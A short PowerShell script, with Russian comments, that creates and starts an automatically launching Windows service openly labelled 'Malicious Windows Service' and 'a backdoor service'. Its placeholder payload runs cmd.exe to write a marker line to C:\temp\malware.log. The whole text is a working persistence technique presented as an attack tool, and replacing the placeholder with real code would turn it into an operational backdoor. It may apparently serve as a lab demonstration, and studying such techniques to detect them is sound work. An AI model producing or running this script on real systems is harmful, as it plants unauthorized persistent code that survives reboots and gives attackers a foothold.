$ServiceName = "MaliciousService"
$BinaryPath = "C:\Windows\System32\cmd.exe /c echo Malicious Code Executed > C:\temp\malware.log"

Write-Output "[+] Creating malicious Windows service..."

# Создание сервиса
New-Service -Name $ServiceName -BinaryPathName $BinaryPath -DisplayName "Malicious Windows Service" -Description "This is a backdoor service" -StartupType Automatic

# Запуск сервиса
Start-Service -Name $ServiceName

Write-Output "[+] Malicious service installed and started!"
